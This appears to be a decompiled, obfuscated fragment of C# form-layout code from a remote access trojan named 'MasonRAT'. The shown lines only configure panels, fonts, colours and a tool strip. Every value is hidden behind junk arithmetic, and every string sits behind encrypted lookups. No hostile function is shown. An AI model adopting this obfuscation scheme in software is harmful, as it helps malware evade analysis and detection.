    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.Size = new Size(((1057117380 << 1199534716) - 2003298881 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) + (-1758745470 - (1556190004 | 1124285528) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0) % ((1362846502 ^ 1867479928 >> 16732202) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, 451);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.TabIndex = 1341588072 - ~694401143 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) - ((1021026103 | 1560526442) - 75564208 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0;
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.BorderRadius = ((1456280255 - (1943885199 >> 1531807231) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) > 1407431731 + (873140744 << 1360550345) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ? 681329875 % 102795581 - 64556383 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0 : -1083399872 - ~1083399876 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0;
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.BorderThickness = 0;
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.Controls.Add((Control) this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ);
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.Controls.Add((Control) this.\u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ);
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.CustomBorderColor = Color.FromArgb((475341746 - (759523051 | 1034013967) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0 ^ -(965790734 + (300580474 << 738618618) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, 466319874 + (1726255390 >> 1313331991) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 - (532851829 - (55587219 | 31924548) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1)) % ((51533875 > 1950106141 ? 1728487642 : 1296365732) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, (~110287247 - 87172832 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1)) + ((485770661 ^ 1003129596 % 614024600) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0);
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.FillColor = Color.FromArgb((700226575 - 700226515 % 1240260448 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0) ^ 282114883 - 1159024666 % 876909796 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, ((1615989202 > 415952058 ? 305826353 : 407768470) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1) + ~(305633304 + (790524268 >> 136557996) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0, (-1037894500 - 1565246374 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1) - ((-526274900 ^ ~2072603126) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0);
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2733), 15.75f, FontStyle.Regular, (GraphicsUnit) (((-2063199829 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) + ((1646774570 ^ 31846029 >> 423150277) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1 | (254172531 ^ (1087116576 | 1474287406)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0), (byte) 0);
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.Location = new Point(((1560841804 ^ ~1125070654) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0) + (457685375 - (1937301482 << 1127465397) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0) % (-1140941179 - 1014403286 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, 48 /*0x30*/);
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2734);
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.ShadowDecoration.Enabled = true;
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.Size = new Size(890996120 - 890814470 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) - ((741242638 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 >> ((699642380 ^ 997997884 << 662027214) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, 388);
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.TabIndex = (322229084 + 1539286740 % 49634948 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) ^ (-236493284 - (1442075884 << 875733857) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0)) % ((-1494509796 ^ ~1809112259) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0;
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2735);
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.BackColor = Color.FromArgb(((950894961 > 1819543628 ? -1622172827 : 2004595852) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0) ^ (612921981 - (669049057 >> 316999527) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1) | (1370076213 ^ 222045914 << 1604629040) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, (1453665191 - (2040961445 >> 1036541945) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) + ~((1453665565 ^ 824336712 >> 282281395) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, ((1931569083 > 540912206 ? 83 : 110) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) - ((637453369 + 602253346 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1) >> 16174292 - (310931172 >> 1995296777) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0);
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.ImageScalingSize = new Size((631063784 - (1758868564 >> 135800670) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) > ~1101955480 - 1250419709 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) ? 1354885206 - 1354885174 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1 : (14 ^ 22) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, 24);
    ToolStripItemCollection items2 = this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.Items;
    ToolStripItem[] toolStripItems2 = new ToolStripItem[(1125509152 + 228549561 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1) ^ ((1354214895 ^ 389128195 >> 1903507851) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0) % (-1499912821 - 819668203 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0];
    toolStripItems2[0] = (ToolStripItem) this.\u2694️MasonRAT\u270C\u060A\u060D\u0609ٻ\u060B\u0020\u0609ٸ\u0608\u060D\u060B;
    toolStripItems2[1] = (ToolStripItem) this.\u2694️MasonRAT\u270Cﯧۛ̍اڜ\u0020\u060D\u060Aڠ\u060Aڣةـﻻ\u060Aﻻ\u0608ــ;
    items2.AddRange(toolStripItems2);
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.Location = new Point(0, 364);
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2736);
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.Padding = new Padding(1, 0, ((1012494587 ^ 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0) - ((1012494586 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, 0);
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.Size = new Size(((229604104 > 1004688690 ? -1673797356 : -1255348017) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1)) - ~(1255347986 + (187105620 >> 1236374002) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0, 24);
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.TabIndex = (1813299642 - (929817509 >> 1159828809) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0 ^ (-1137781360 - 1345702342 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0) % ((2001301191 ^ 732410015 >> 753041086) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0;
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2737);
    this.\u2694️MasonRAT\u270C\u060A\u060D\u0609ٻ\u060B\u0020\u0609ٸ\u0608\u060D\u060B.Font = new Font(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2738), 12f, FontStyle.Regular, (GraphicsUnit) ((267342424 - 2037840935 % 1375315569 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 ^ 0)) + ((1580731792 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1) >> (410756741 > 331919673 ? 590099586 : 786799448) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)), (byte) 0);
    this.\u2694️MasonRAT\u270C\u060A\u060D\u0609ٻ\u060B\u0020\u0609ٸ\u0608\u060D\u060B.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270C\u060A\u060D\u0609ٻ\u060B\u0020\u0609ٸ\u0608\u060D\u060B.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2739);
